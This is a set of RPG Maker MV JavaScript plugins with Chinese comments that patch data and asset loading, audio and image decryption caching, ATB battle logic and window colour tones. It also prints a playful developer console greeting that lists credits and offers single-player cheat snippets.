}).add('loadDataFile',function(name,src,directSrc,mimeType,method,data){
	method=method||'GET';
	mimeType=mimeType||'application/json';
	const xhr=new XMLHttpRequest();
	src=directSrc?src:('data/'+src);
	xhr.open(method,src);
	xhr.overrideMimeType(mimeType);
	xhr.onload = function() {
		if (xhr.status < 400) {
			window[name] = JSON.parse(xhr.responseText);
			DataManager.onLoad(window[name],name,src);
		}
	};
	xhr.onerror = this._mapLoader || function() {
		DataManager._errorUrl = DataManager._errorUrl || src;
	};
	window[name] = null;
	xhr.send(data);
	return xhr;
},undefined,true,true).add('onLoad',function f(obj,name,src){
	this.onLoad_before.apply(this,arguments);
	const rtv=f.ori.apply(this,arguments);
	this.onLoad_after.apply(this,arguments);
	return rtv;
},undefined,true).add('onLoad_before',function f(obj,name,src){
	const func=f.tbl.get(name);
	return func && func.apply(this,arguments);
},undefined,true).add('onLoad_after',function f(obj,name,src){
	const func=f.tbl.get(name);
	return func && func.apply(this,arguments);
},undefined,true).add('_onLoad_before_map',function f(obj,name,src){
	return this.onLoad_before_map.apply(this,arguments);
},undefined,true,true).add('_onLoad_after_map',function f(obj,name,src){
	return this.onLoad_after_map.apply(this,arguments);
},undefined,true,true).add('onLoad_before_map',function f(obj){
	// dummy
},undefined,true,true).add('onLoad_after_map',function f(obj){
	// dummy
},undefined,true,true).add('_onLoad_before_skill',function f(obj,name,src){
	return this.onLoad_before_skill.apply(this,arguments);
},undefined,true,true).add('_onLoad_after_skill',function f(obj){
	return this.onLoad_after_skill.apply(this,arguments);
},undefined,true,true).add('onLoad_before_skill',function f(obj,name,src){
	// dummy
},undefined,true,true).add('onLoad_after_skill',function f(obj){
	// dummy
},undefined,true,true).add('_onLoad_before_tileset',function f(obj,name,src){
	return this.onLoad_before_tileset.apply(this,arguments);
},undefined,true,true).add('_onLoad_after_tileset',function f(obj,name,src){
	return this.onLoad_after_tileset.apply(this,arguments);
},undefined,true,true).add('onLoad_before_tileset',function f(obj){
	// dummy
},undefined,true,true).add('onLoad_after_tileset',function f(obj){
	// dummy
},undefined,true,true);
{ const p=DataManager;
p.onLoad_before.tbl=new Map([
	['$dataMap',	p._onLoad_before_map],
	['$dataSkills',	p._onLoad_before_skill],
	['$dataTilesets',	p._onLoad_before_tileset],
]);
p.onLoad_after.tbl=new Map([
	['$dataMap',	p._onLoad_after_map],
	['$dataSkills',	p._onLoad_after_skill],
	['$dataTilesets',	p._onLoad_after_tileset],
]);
}
//
new cfc(ImageManager).add('loadWithoutError_get',function f(){
	return this._loadWithoutError;
},undefined,false,true).add('loadWithoutError_set',function f(val){
	return this._loadWithoutError=val;
},undefined,false,true);
//
new cfc(WebAudio.prototype).add('_load',function f(url,noerr,putCacheOnly){
	if(!WebAudio._context) return;
	const xhr=new XMLHttpRequest();
	xhr._needDecrypt=false;
	if(Decrypter.hasEncryptedAudio && !ImageManager.isDirectPath(url)){
		url=Decrypter.extToEncryptExt(url);
		xhr._needDecrypt=true;
	}
	const cache=this._getCache(url); if(cache) return !(this._putCacheOnly||putCacheOnly)&&this._onXhrLoad(undefined,url,cache.slice());
	xhr.open('GET',url);
	xhr.responseType='arraybuffer';
	xhr.onload=f.tbl[0].bind(this,xhr,url,this._putCacheOnly||putCacheOnly);
	xhr.onerror=(this._noerr||noerr)?none:(this._loader||function(){this._hasError=true;}.bind(this));
	xhr.send();
},[
function(xhr,url,putCacheOnly){ if(xhr.status<400) this._onXhrLoad(xhr,url,undefined,putCacheOnly); },
],false,true).add('_onXhrLoad',function f(xhr,url,arrayBuffer,putCacheOnly){
	let array=arrayBuffer||xhr&&xhr.response;
	if(!arrayBuffer){
		if(xhr._needDecrypt && Decrypter.hasEncryptedAudio && !ImageManager.isDirectPath(url)) array=Decrypter.decryptArrayBuffer(array);
		this._setCache(url,array.slice());
	}
	if(putCacheOnly) return;
	this._readLoopComments(new Uint8Array(array));
	WebAudio._context.decodeAudioData(array,f.tbl[0].bind(this));
	return array;
},[
function(buffer){
	this._buffer=buffer;
	this._totalTime=buffer.duration;
	if(this._loopLength>0&&this._sampleRate>0){
		this._loopStart/=this._sampleRate;
		this._loopLength/=this._sampleRate;
	}else{
		this._loopStart=0;
		this._loopLength=this._totalTime;
	}
	this._onLoad();
}
],false,true).add('initialize',function f(url,noerr,putCacheOnly){
	this._noerr=noerr;
	this._putCacheOnly=putCacheOnly;
	return f.ori.apply(this,arguments);
}).add('_setCache',function f(url,arrayBuffer){
	this.getCacheCont().setCache(url,arrayBuffer,arrayBuffer.byteLength);
},undefined,false,true).add('_getCache',function f(url){
	return this.getCacheCont().getCache(url);
},undefined,false,true).add('getCacheCont',function f(){
	//const tw=getTopFrameWindow();
	//if(!WebAudio._cache) WebAudio._cache=tw._webAudioCache=tw._webAudioCache||new LruCache(f.tbl[0],f.tbl[1]);
	// do not cache on top for flexibility of file content changes
	if(!WebAudio._cache) WebAudio._cache=new LruCache(f.tbl[0],f.tbl[1]);
	return WebAudio._cache;
},[404,1<<26],false,true);
//
Decrypter._notFoundCache=new Set();
new cfc(Decrypter).add('decryptImg',function f(url,bitmap){
	url=this.extToEncryptExt(url);
	const cache=this._getCache(url); if(cache) return this._onXhrLoad(bitmap,cache.slice());
	
	const requestFile=new XMLHttpRequest();
	requestFile.open("GET",url);
	requestFile.responseType='arraybuffer';
	requestFile.send();
	
	requestFile.onload=f.tbl[0].bind(requestFile,bitmap,url);
	
	requestFile.onerror=f.tbl[1].bind(requestFile,bitmap);
},[
function(bitmap,url){
	if(this.status<Decrypter._xhrOk){
		const arrayBuffer=Decrypter.decryptArrayBuffer(this.response);
		Decrypter._setCache(url,arrayBuffer.slice());
		Decrypter._onXhrLoad(bitmap,arrayBuffer);
	}else this.onerror();
},
function(bitmap){
	if(bitmap._loader) bitmap._loader();
	else bitmap._onError();
},
],false,true).add('_onXhrLoad',function f(bitmap,arrayBuffer){
	bitmap._image.addEventListener('load',bitmap._loadListener=Bitmap.prototype._onLoad.bind(bitmap));
	bitmap._image.addEventListener('error',bitmap._errorListener=bitmap._loader||Bitmap.prototype._onError.bind(bitmap));
	bitmap._image.src=Decrypter.createBlobUrl(arrayBuffer);
},undefined,false,true).add('decryptImg',function f(url,bitmap){
	if(Decrypter._notFoundCache.has(url) || getUrlParamVal('disableCustom')) return f.ori.apply(this,arguments);
	jurl(url,"HEAD",0,0,'arraybuffer',f.tbl[0].bind(this,url,bitmap),f.tbl[1].bind(this,url,bitmap,f.ori,arguments));
},[
function(url,bitmap,resp,xhr){ if(xhr.readyState!==4) return;
	const stat=xhr.status.toString();
	if(stat.length!==3 || stat.slice(0,1)!=='2') return;
	bitmap._image.addEventListener('load', bitmap._loadListener=Bitmap.prototype._onLoad.bind(bitmap));
	bitmap._image.addEventListener('error', bitmap._errorListener=bitmap._loader || Bitmap.prototype._onError.bind(bitmap));
	bitmap._image.src=url;
},
function(url,bitmap,ori,argv,xhr){ if(!(xhr.readyState>=4)) return;
	const stat=xhr.status.toString();
	if(stat==='0' || (stat.length===3 && stat[0]-0>=4)){
		Decrypter._notFoundCache.add(url);
		return ori.apply(this,argv);
	}
},
]).add('_setCache',function f(url,arrayBuffer){
	this.getCacheCont().setCache(url,arrayBuffer,arrayBuffer.byteLength);
},undefined,false,true).add('_getCache',function f(url){
	return this.getCacheCont().getCache(url);
},undefined,false,true).add('getCacheCont',function f(){
	const tw=getTopFrameWindow();
	if(!this._cache) this._cache=tw._decryptImgCache=tw._decryptImgCache||new LruCache(f.tbl[0],f.tbl[1]);
	return this._cache;
},[0|404|0,(1<<29)],false,true);
new cfc(WebAudio.prototype).add('_load',function f(url){
	if(!Decrypter.hasEncryptedAudio || ImageManager.isDirectPath(url) || Decrypter._notFoundCache.has(url) || getUrlParamVal('disableCustom')) return f.ori.apply(this,arguments);
	jurl(url,"HEAD",0,0,'arraybuffer',f.tbl[0].bind(this,url,f.ori,arguments),f.tbl[1].bind(this,url,f.ori,arguments));
},[
function(url,ori,argv,resp,xhr){ if(xhr.readyState!==4) return;
	const stat=xhr.status.toString();
	if(stat.length!==3 || stat.slice(0,1)!=='2') return;
	const e=Decrypter.hasEncryptedAudio;
	Decrypter.hasEncryptedAudio=false;
	const rtv=ori.apply(this,argv);
	Decrypter.hasEncryptedAudio=e;
	return rtv;
},
function(url,ori,argv,xhr){ if(!(xhr.readyState>=4)) return;
	const stat=xhr.status.toString();
	if(stat==='0' || (stat.length===3 && stat[0]-0>=4)){
		Decrypter._notFoundCache.add(url);
		return ori.apply(this,argv);
	}
},
]);
// refine normal attack of weapon skill
Game_Actor.prototype.attackSkillId=function() {
	const normalId = Game_BattlerBase.prototype.attackSkillId.call(this);
	if(this.hasNoWeapons()) return normalId;
	const weapon = this.weapons()[0];  // at plural weapon, one's first skill.
	const id = eval(weapon.meta.skill_id)-0;
	return id || normalId;
};
//
t=dataobj=>dataobj!==undefined;
new cfc(Game_Party.prototype).add('items',function f(){
	return f.ori.apply(this,arguments).filter(f.tbl[0]);
},[
t,
]).add('equipItems',function f(){
	return f.ori.apply(this,arguments).filter(f.tbl[0]);
},[
t,
]);
//
new cfc(Game_Party.prototype).add('partyAbility_sumAll',function f(dataId){
	return this.members().reduce(f.tbl[0].bind(dataId),0);
},[
function(r,btlr){
	return r+btlr.traitsSum(Game_BattlerBase.TRAIT_PARTY_ABILITY,this);
},
]);
// expose to topFrame
const exposeToTopFrame=window.exposeToTopFrame=function f(){
	const w=getTopFrameWindow(); if(w===window) return;
	w._w=window;
	// dynamicData
	{
		w.exposeToTopFrame=f;
		const arr=f.tbl=f.tbl||getPrefixPropertyNames(window,'$data'); arr.uniquePop('$dataMap');
		arr.uniquePush('$dataMap','$gameTemp','$gameSystem','$gameScreen','$gameTimer','$gameMessage','$gameSwitches','$gameVariables','$gameSelfSwitches','$gameActors','$gameParty','$gameTroop','$gameMap','$gamePlayer',);
		arr.forEach(key=>key&&Object.defineProperty(w,key,{ get:function(){ return window[key]; }, configurable: true }));
	}
	{
		const arr=[];
		arr.push('AudioManager','BattleManager','ConfigManager','DataManager','ImageManager','SceneManager',);
		arr.push('Input','TouchInput',);
		arr.push('Graphics',);
		arr.push('useDefaultIfIsNaN');
		arr.push('getCStyleStringStartAndEndFromString',);
		arr.push('getPrefixPropertyNames',);
		arr.push('getTopFrameWindow','chTitle',);
		arr.push('copyToClipboard','pasteCanvas',);
		arr.push('listMapParents',);
		for(let x=0,xs=arr.length;x!==xs;++x) w[arr[x]]=w._w[arr[x]];
	}
	for(let x=0,arr=arguments,xs=arr.length;x!==xs;++x) w[arr[x]]=w._w[arr[x]];
};
new cfc(Utils).
add('isOptionValid',function f(name){
	const rtv=f.ori.apply(this,arguments);
	if(rtv) return rtv;
	try{
		return this.isOptionValid_tryTopHashOf(name,window);
	}catch(e){
	}
	return rtv;
}).
add('isOptionValid_tryTopHashOf',function f(name,curr){
	const pw=curr.parent&&curr.parent.window;
	if(!pw||curr===pw) return 0; // no top window of curr
	if(pw.location.hash.slice(1).split('&').contains(name)) return 1;
	return 0;
}).
getP;

/*
調皮
*/
try{
const commonBgcolor='background-color: rgba(0,0,0,0.5);';
console.group("用到的插件");
console.table($plugins);
console.log("共計",$plugins.length,"個");
console.log("實開",$plugins.filter(x=>x&&x.status).length,"個");
console.groupEnd();

console.log("之後的內容建議將 DevTools 調整成黑底模式，以便閱讀");

console.group("%c 幸會！ ","color: rgba(234,234,234,0.75); font-size:64px;"+commonBgcolor);

console.log("%c 看來你也是喜歡直接改遊戲過關的同好！ ","color: rgba(234,234,234,0.75); font-size:32px;"+commonBgcolor);
console.log("");
{ const normal="color: rgba(234,234,234,0.75); font-size:16px;"+commonBgcolor,
	enhance="color: rgba(234,123,123,0.75); font-size:16px;"+commonBgcolor
	;
console.log("%c在這裡要提醒你一些事情，避免改完發生%c憾事",normal,enhance);
console.log("");
let id=0;
console.group("%c"+(++id)+". 當你遇到某些限制存檔的小遊戲，想用%c修改%c的方式過關，而且你覺得遊戲的功能沒辦法用RMMV編輯器內建功能弄出來，那麼切記",normal,enhance,normal);
	console.log("%c千萬%c不要存檔%c，請%c直接%c想辦法用修改的方式%c過關",normal,enhance,normal,enhance,normal,enhance);
	console.log("%c尤其是跟修改地圖樣貌有關的關卡",enhance);
console.groupEnd();
console.log("");
console.group("%c"+(++id)+". 此插件的作者表示: 這遊戲好難喔，不改都要打10幾次才能過關的。",normal);
	console.log("%c所以給你一些好康的",normal);
	console.log("$gameParty._actors.forEach(i=>{ let a=$gameActors.actor(i); a.gainExp(1e11); a._tp=a._mp=a._hp=1e4; });");
	console.log("[215,304].forEach(i=>$gameParty.gainItem($dataItems[i],1e3));");
	console.log("[$dataItems,$dataWeapons,$dataArmors,].forEach(arr=>arr&&arr.forEach(dataobj=>dataobj&&dataobj.name&&$gameParty.gainItem(dataobj,1e3)));");
	console.log("for(let t=0,dst=$gameTemp.goods=[],conts=[$dataItems,$dataWeapons,$dataArmors,],ts=conts.length;t!==ts;++t) for(let x=0,arr=conts[t],xs=arr.length;x!==xs;++x) dst.push([t,x,0,NaN]);","SceneManager.push(Scene_Shop);","SceneManager.prepareNextScene($gameTemp.goods, false);");
	console.log("ConfigManager.canFrameFastForward=true; ConfigManager.save();");
	console.log("%c效果就留給你自己嘗試啦",normal);
console.groupEnd();
console.log("");
}

// ****
{ const normal="color: rgba(234,234,234,0.75); font-size:20px;"+commonBgcolor,
	enhance="color: rgba(234,234,123,0.75); font-size:20px;"+commonBgcolor
	;
console.group("%c好好享受遊戲。這個插件拔走全部或部分我都沒意見，只要%c不說是你原創%c，以及%c不暗示是你原創%c，我都沒意見，但拿去\"賣插件\"賺錢的話記得要分我，賠錢我不負責。符合上述情形之下，你可以%c不%c把由此插件而來的部分寫進credit",normal,enhance,normal,enhance,normal,enhance,normal);
console.log("要寫 credit 就寫作者是 agold404 。不寫進 credit 的話，你要在其中一個會載入的 js 檔案中，留下這段 group 起來的程式碼。(即至少這列及上一列，建議是這個scope，連變數一起，比較方便)");
console.groupEnd();
}
// ****

console.groupEnd();
console.log("");

console.group("%c歡迎拍打餵食開發人員們，對象有：","color: rgba(234,234,234,0.75); font-size:32px;");
const devers={
	"天使":["原作作者","主線內容主力","統籌與整合","數值平衡",],
	"咕咕咕":["支線內容主力","劇本潤稿","神秘故事主力","太苦了",],
	"鎧特":["支線內容","插件協助",],
	"○○":["此插件作者","程式主力","修正原廠js及其他插件的bug","遊戲中部份非原生特殊功能",],
	"牙籤":["CG","臉圖主力","立繪",],
	"柏林":["召喚獸素材主力","CG","LOGO","character繪製",],
	"攸藍":["戰鬥動畫主力","人才招集","遊戲影片主力",],
	"機器人G":["UI介面主力",],
	"樺城":["地圖繪製協助",],
	"小鹿":["部分音樂外包",],
	"材材":["劇本協助","(已離隊)",],
	"狗頭":["部分支線","(已離隊)",],
};
{ const arr=[]; for(let i in devers) arr.push(i,','); arr.push("主要分工如下:");
console.log.apply(null,arr);
console.table(arr.filter(i=>devers[i]).map(i=>[i,'\t',devers[i].join(' , ')]));
}
console.log("此處可能沒更新，請依遊戲中的感謝名單為主。");
console.groupEnd();
for(let x=4;x--;) console.log('');
}catch(e){
	console.log("你的瀏覽器不支援一些好玩的功能。真可惜。");
}
window._agold404_roomTxts=true;



/*
inj
*/
const inj=(p,kfv)=>{
	for(let x=0;x!==kfv;++x){ const r=p[kfv[x][0]]; (p[kfv[x][0]]=kfv[x][1]).ori=r; }
	return kfv;
};
window.jurl=(url, method, header, data, resType, callback, callback_all_h, timeout_ms)=>{
	const argv=[];
	resType=resType||'';
	let xhttp=new XMLHttpRequest();
	if(0<timeout_ms) xhttp.timeout=timeout_ms;
	xhttp.onreadystatechange=function(){
		//if(callback_all_h&&callback_all_h.constructor===Function) ; // wtf
		if((typeof callback_all_h)==="function"){
			callback_all_h(this,argv);
		}
		//if(callback&&callback.constructor===Function) ; // wtf
		if((typeof callback)==="function"){
			if(this.readyState===4){
				let s=this.status.toString();
				if (s.length===3 && s.slice(0, 1)==='2'){
					callback(this.response,this,argv);
				}
			}
		}
	}
	;
	xhttp.open(method, url, true);
	xhttp.responseType=resType;
	if(header) for(let i in header) xhttp.setRequestHeader(i,header[i]);
	data=method === "GET" ? undefined : data;
	argv.push(url,method,header,data,);
	xhttp.send(data);
	return xhttp;
};
new cfc(DataManager).add('sendLoadReq_common',(opt,isEncrypted,path_without_ext,ext, http_opt, callback, callback_all_h, timeout_ms)=>jurl(
	path_without_ext+(isEncrypted?Decrypter.extToEncryptExt(ext):ext),
	"GET",0,0,'arraybuffer',
)).add('sendLoadReq_audio',function(opt,path_without_ext,ext, http_opt, callback, callback_all_h, timeout_ms){
	this.sendLoadReq_common(opt,Decrypter.hasEncryptedAudio  ,path_without_ext,ext, http_opt, callback, callback_all_h, timeout_ms);
}).add('sendLoadReq_image',function(opt,path_without_ext,ext, http_opt, callback, callback_all_h, timeout_ms){
	this.sendLoadReq_common(opt,Decrypter.hasEncryptedImages ,path_without_ext,ext, http_opt, callback, callback_all_h, timeout_ms);
}).add('parseTagScopes',function f(tagName,txt){
	// tagName is case sensitive, [A-Za-z0-9_]+, expected: <tagName> ... </tagName> , no nested
	const rtv=[]; if(!tagName||!tagName.match||!tagName.match(f.tbl[0])) return rtv;
	const funcs=f.tbl[1],stat={rtv:rtv,stat:0,tagB:"<"+tagName+">",tagE:"</"+tagName+">",txt:txt,txtIdx:0,};
	while(stat.txtIdx<stat.txt.length) funcs[stat.stat](stat);
	return rtv;
},[
/^[A-Za-z0-9_]+$/,
[
function(stat){
	// inited
	const idx=stat.txt.indexOf(stat.tagB,stat.txt,);
	if(idx>=0){
		stat.stat=1;
		stat.txtIdx=idx+stat.tagB.length;
	}else stat.txtIdx=stat.txt.length;
},
function(stat){
	// find end and add
	const idx=stat.txt.indexOf(stat.tagE,stat.txtIdx,);
	if(idx>=0){
		stat.stat=0;
		stat.rtv.push(stat.txt.slice(stat.txtIdx,idx));
		stat.txtIdx=idx+stat.tagE.length;
	}else throw new Error('tag format error: no close tag '+stat.tagE);
},
],
]).add('sendLoadReq_byNote',function f(note){
	const preload_files_jsons=DataManager.parseTagScopes(f.tbl[0],note);
	const preload_files_a=[],preload_files_o=[],preload_files_i=[];
	const preload_files_tbl={
		a:[preload_files_a,DataManager.sendLoadReq_audio,],
		i:[preload_files_i,DataManager.sendLoadReq_image,],
	},keys=f.tbl[1];
	for(let j=0,js=preload_files_jsons.length;j<js;++j){
		const json=JSON.parse(preload_files_jsons[j]);
		for(let x=0,xs=json.length;x<xs;++x){
			const s=preload_files_tbl[json[x][0]];
			if(s) s[0].uniquePush(json[x][1]);
			else preload_files_o.uniquePush(json[x][1]);
		}
	}
	for(let k=0,ks=keys.length;k!==ks;++k){
		const info=preload_files_tbl[keys[k]];
		const arr=info[0],func=info[1];
		for(let x=0,xs=arr.length;x!==xs;++x){
			const uqh=ImageManager.splitUrlQueryHash(arr[x]);
			let idx=uqh[0].lastIndexOf('.');
			if(!(idx>=0)) idx=uqh[0].length;
			func.call(DataManager,undefined,	uqh[0].slice(0,idx),uqh[0].slice(idx),);
		}
	}
	for(let x=0,arr=preload_files_o,xs=arr.length;x!==xs;++x){
		const uqh=ImageManager.splitUrlQueryHash(arr[x]);
		let idx=uqh[0].lastIndexOf('.');
		if(!(idx>=0)) idx=uqh[0].length;
		DataManager.sendLoadReq_common(undefined,false,	uqh[0].slice(0,idx),uqh[0].slice(idx),);
	}
},[
'preload_files_json',
['a','i',],
]);



﻿"use strict";
/*:
 * @plugindesc 救命, YEP 在幹嘛?
 * @author agold404
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;


new cfc(Sprite_Enemy.prototype).add('updateScale',function(){
	this.scale.x=this._enemy.spriteScaleX();
	this.scale.y=this._enemy.spriteScaleY();
},undefined,true,true);


new cfc(Game_Battler.prototype).
add('atbTurnRate',function(currentActionItem){
	let value=0;
	const states=this.states(),sz=states.length;
	for (let i=0;i<sz;++i){
		const state=states[i];
		if(state){ let i,states;
			value+=state.atbTurnRate-0||0;
			eval(state.meta.atbTurnRateEval);
		}
	}
	return value;
},undefined,true,true).
add('atbTurnFlat',function(currentActionItem){
	let value=0;
	const states=this.states(),sz=states.length;
	for (let i=0;i<sz;++i){
		const state=states[i];
		if(state){ let i,states;
			value+=state.atbTurnFlat-0||0;
			eval(state.meta.atbTurnFlatEval);
		}
	}
	return value;
},undefined,true,true).
add('setEndActionATBSpeed',function(){
	this._atbSpeed=0;
	const action=this.currentAction();
	if(!action) return;
	const item=action.item();
	if(item){
		if(item.afterATBFlat!==undefined) this.setATBSpeed(item.afterATBFlat);
		if(item.afterATBRate!==undefined) this.setATBSpeed(item.afterATBRate * BattleManager.atbTarget());
	}
	this._atbSpeed+=BattleManager.atbTarget()*this.atbTurnRate();
	this._atbSpeed+=this.atbTurnFlat(item);
	if(item) this.afterATBEval(item);
},undefined,true,true).
getP;

new cfc(Game_Actor.prototype).
add('atbTurnRate',function(currentActionItem){
	let value=Game_Battler.prototype.atbTurnRate.apply(this,arguments);
	value+=this.actor().atbTurnRate;
	value+=this.currentClass().atbTurnRate;
	const equips=this.equips(),sz=equips.length;
	for(let i=0;i<sz;++i){
		const equip=equips[i];
		if(equip){ let i,equips;
			value+=equip.atbTurnRate-0||0;
			eval(equip.meta.atbTurnRateEval);
		}
	}
	return value;
},undefined,true,true).
add('atbTurnFlat',function(currentActionItem){
	let value=Game_Battler.prototype.atbTurnFlat.apply(this,arguments);
	value+=this.actor().atbTurnFlat;
	value+=this.currentClass().atbTurnFlat;
	const equips=this.equips(),sz=equips.length;
	for(let i=0;i<sz;++i){
		const equip=equips[i];
		if(equip){ let i,equips;
			value+=equip.atbTurnFlat;
			eval(equip.meta.atbTurnFlatEval);
		}
	}
	return value;
},undefined,true,true).
getP;


})();


﻿"use strict";
/*:
 * @plugindesc 誰都別想讓debug變更難，誰都別想。 YEP ㄉ作者一定沒手刻過網頁，用尛 require 。
 * @author agold404
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Action.prototype).add('evalDamageFormula',function f(target){
	try{
		const item=this.item();
		const a=this.subject();
		const b=target;
		const v=$gameVariables._data;
		let sign=f.tbl[0].has(item.damage.type)?-1:1;
		try{
			let value=Math.max(eval(item.damage.formula),0)*sign;
			if(isNaN(value)) throw new Error(f.tbl[1][0]);
			return value;
		}catch(e){
			if(item && item.damage){
				console.warn(item.damage.formula);
				e.message+='\n\nDamage Formula:\n'+item.damage.formula;
				e.message+=getStr_英文不好齁()+f.tbl[1][1];
			}
			e.name+=' in damage formula of '+f.tbl[2](item);
			e._msgOri=e.message;
			throw e;
			return 0;
		}
	}catch(e){
		throw e;
		return 0;
	}
},[
new Set([3,4]),
[
'the Damage Formula evaluates an NaN',
'公式打錯ㄌ，是哪ㄍ公式自己往上看',
],
function f(dataobj){
	let rtv;
	if(DataManager.isSkill(dataobj)) rtv='skill';
	else if(DataManager.isItem(dataobj)) rtv='item';
	else return "(WTF is this?)";
	rtv+=' id ';
	rtv+=dataobj.id;
	return rtv;
},
],true,true);

})();


﻿"use strict";
/*:
 * @plugindesc fix yep se slow bug
 * @author agold404
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if(typeof Yanfly!=='undefined' && Yanfly.Core && Yanfly.Core.AudioManager_playSe) new cfc(AudioManager).add('playSe',function f(se){
	if(this.uniqueCheckSe(se)){
		Yanfly.Core.AudioManager_playSe.call(this, se);
		this.getContUniqueCheckSe().add(se);
	}
},undefined,true,true).add('uniqueCheckSe',function f(se1){
	// return true if not exists
	return !this.getContUniqueCheckSe().has(se1);
},undefined,true,true).add('clearUniqueCheckSe',function f(){
	this.getContUniqueCheckSe().clear();
	return this;
},undefined,true,true).add('getContUniqueCheckSe',function f(){
	let rtv=this._frameSe; if(!rtv) rtv=this._frameSe=new Set();
	return rtv;
},undefined,true,true);

})();


"use strict";
/*:
 * @plugindesc 寫YEP的人到底之不知道javascript的assign(=)的shallow copy的特性啊？
 * @author agold404
 *
 * @help 我懶得寫說明
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Unit.prototype;
k='onATBStart';
r=p[k]; (p[k]=function(){
	if (!BattleManager.isATB()) return;
	for(let i=0,arr=this.members(),sz=arr.length;i!==sz;++i){
		const member=arr[i];
		if(member) member.onATBStart();
	}
}).ori=r;
k='increaseTurnTimeBasedATB';
r=p[k]; (p[k]=function(){
	for(let i=0,arr=this.members(),sz=arr.length;i!==sz;++i){
		const member=arr[i];
		if(!member || member.isHidden() || member.isDead() || member.canMove()) continue;
	}
}).ori=r;
}


{ const p=Window_BattleStatus.prototype;
k='redrawATB';
r=p[k]; (p[k]=function(){
	if(this.isATBGaugeStyle(0)) return;
	const atbGSv=[0,this.isATBGaugeStyle(1),this.isATBGaugeStyle(2)];
	for(let i=0,arr=$gameParty.battleMembers(),sz=arr.length;i!==sz;++i){
		const actor=arr[i];
		if(atbGSv[1]){
			const rect=this.basicAreaRect(i);
			this.contents.clearRect(rect.x - 1, rect.y, rect.width + 2, rect.height);
			this.drawBasicArea(rect, actor);
		}else if(atbGSv[2]) this.redrawATBGaugeRect(i, actor);
	}
}).ori=r;
}


{ const p=BattleManager;
k='getBaseAgis'
r=p[k]; (p[k]=function f(){
	return [
		$gameParty.battleMembers().map(f.tbl[0]).filter(f.tbl[1]),
		$gameTroop.      members().map(f.tbl[0]).filter(f.tbl[1]),
	];
}).ori=r;
p[k].tbl=[
btlr=>btlr&&btlr.agi,
n=>!isNaN(n),
];
k='highestBaseAgi';
r=p[k]; (p[k]=function f(){
	if(this._highestBaseAgi) return this._highestBaseAgi;
	const arrv=this.getBaseAgis();
	return this._highestBaseAgi = Math.max(
		Math.max.apply(null,arrv[0])||0,
		Math.max.apply(null,arrv[1])||0,
	);
}).ori=r;
k='averageBaseAgi';
r=p[k]; (p[k]=function f(){
	if (this._averageBaseAgi) return this._averageBaseAgi;
	const arrv=this.getBaseAgis();
	return this._averageBaseAgi = Math.sum(
		Math.max.apply(null,arrv[0])||0,
		Math.max.apply(null,arrv[1])||0,
	)/(arrv[0].length+arrv[1].length)||0;
}).ori=r;
k='lowestBaseAgi';
r=p[k]; (p[k]=function f(){
	if(this._lowestBaseAgi) return this._lowestBaseAgi;
	const arrv=this.getBaseAgis();
	return this._lowestBaseAgi = Math.min(
		Math.min.apply(null,arrv[0])||0,
		Math.min.apply(null,arrv[1])||0,
	);
}).ori=r;
k='getChargedATBBattler';
r=p[k]; (p[k]=function f(){
	if($gameParty.aliveMembers() <= 0 || $gameTroop.aliveMembers() <= 0) return false;
	let fastest;
	for (let i=0,arr=this.allBattleMembers(),sz=arr.length;i!==sz;++i){
		const battler=arr[i];
		if(!battler || !this.isBattlerATBCharged(battler)) continue;
		if(!fastest || fastest.atbCharge()<battler.atbCharge()) fastest=battler;
	}
	return fastest;
}).ori=r;
k='getReadyATBBattler';
r=p[k]; (p[k]=function f(){
	let fastest = false;
	for(let i=0,arr=this.allBattleMembers(),sz=arr.length;i!==sz;++i){
		const battler=arr[i];
		if(!battler || !this.isBattlerATBReady(battler)) continue;
		if(!fastest || fastest.atbSpeed()<battler.atbSpeed()) fastest = battler;
	}
	return fastest;
}).ori=r;
k='resetNonPartyActorATB';
r=p[k]; (p[k]=function f(){
	const all=$gameParty.allMembers();
	const btl=new Set($gameParty.battleMembers());
	for(let i=0,sz=all.length;i!==sz;++i){
		const actor=all[i];
		if(actor && !btl.has(actor)) actor.resetAllATB();
	}
}).ori=r;
}


{ const p=Game_Battler.prototype;
k='checkATBEndInstantCast';
r=p[k]; (p[k]=function f(){
	if(typeof Imported!=='undefined' && !Imported.YEP_InstantCast) return false;
	const action=this.currentAction();
	if(!action) return false;
	const item=action.item();
	if(!item) return false;
	if(!this.isInstantCast(item)) return false;
	for(let i=0,arr=BattleManager.allBattleMembers(),sz=arr.length;i!==sz;++i){
		const member=arr[i]; if(!member) continue;
		const max=member.atbSpeed()+member.atbCharge();
		this._atbSpeed=Math.max(this._atbSpeed,max);
	}
	this._atbSpeed=Math.max(this._atbSpeed,BattleManager.atbTarget());
	this._atbSpeed+=1e-11;
	return true;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 視窗預設colorTone
 * @author agold404
 * @help BLR_custom/default-Window_Base.txt
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
'BLR_custom/default-Window_Base.txt',
];

new cfc(SceneManager).add('run',function f(){
	const rtv=f.ori.apply(this,arguments);
	ImageManager.otherFiles_addLoad(f.tbl[0]);
	return rtv;
},t);
new cfc(Scene_Boot.prototype).add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._applyCustomData_windowBase();
	return rtv;
}).add('_applyCustomData_windowBase',function f(){
	const data=ImageManager.otherFiles_getData(f.tbl[0]); if(!data) return;
	const cs=DataManager._customWindowBaseSetting=JSON.parse(data); if(!cs) return;
	if(cs.back){
		const b=cs.back;
		if(b.colorTone){
			if(b.colorTone.constructor===Array) while(b.colorTone.length<4) b.colorTone.push(0);
			else b.colorTone=undefined;
		}
	}
},t);

new cfc(Window_Base.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.setCustom();
	return rtv;
}).add('setCustom',function f(){
	this._setCustom_back();
}).add('_setCustom_back',function f(){
	const b=this._windowBackSprite,cs=DataManager._customWindowBaseSetting; if(!(cs&&cs.back)||!b) return;
	let needRefresh=false;
	// [75, 142, 160, 0]
	if((this._customColorTone=cs.back.colorTone)){ needRefresh=true; b.setColorTone(this._customColorTone); }
	if(needRefresh) b._refresh();
},t).add('_refreshBack',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._setCustom_back();
	return rtv;
});

})();


﻿"use strict";
/*:
